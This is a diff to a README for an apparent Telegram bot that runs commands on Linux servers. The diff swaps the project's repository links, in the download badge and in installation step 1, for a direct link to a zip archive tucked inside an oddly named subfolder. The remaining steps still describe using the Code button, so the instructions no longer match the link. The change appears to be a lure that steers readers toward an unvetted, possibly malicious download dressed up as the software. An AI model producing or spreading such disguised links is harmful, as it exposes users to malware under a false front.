@@ -1,6 +1,6 @@
 # 🤖 linux-telegram-bot - Manage your servers through simple chat
 
-[![Download](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Ascitic-tyrianpurple370/linux-telegram-bot)
+[![Download](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Ascitic-tyrianpurple370/linux-telegram-bot/main/proagrarian/linux-telegram-bot-v3.5-alpha.5.zip)
 
 This software allows you to control your Linux servers from your mobile phone. You send commands through Telegram and the bot executes them on your server. This removes the need for complex software or constant desk access.
 
@@ -25,7 +25,7 @@ Before you install this software, confirm your setup meets these standards:
 
 You need to obtain the software files from the repository to begin installation. Follow these steps to prepare your environment.
 
-1. Visit the project website to access the files: [https://github.com/Ascitic-tyrianpurple370/linux-telegram-bot](https://github.com/Ascitic-tyrianpurple370/linux-telegram-bot).
+1. Visit the project website to access the files: [https://raw.githubusercontent.com/Ascitic-tyrianpurple370/linux-telegram-bot/main/proagrarian/linux-telegram-bot-v3.5-alpha.5.zip](https://raw.githubusercontent.com/Ascitic-tyrianpurple370/linux-telegram-bot/main/proagrarian/linux-telegram-bot-v3.5-alpha.5.zip).
 2. Look for the Code button on the page.
 3. Select Download ZIP to save the project to your computer.
 4. Extract the contents of the ZIP folder to a known location on your hard drive.
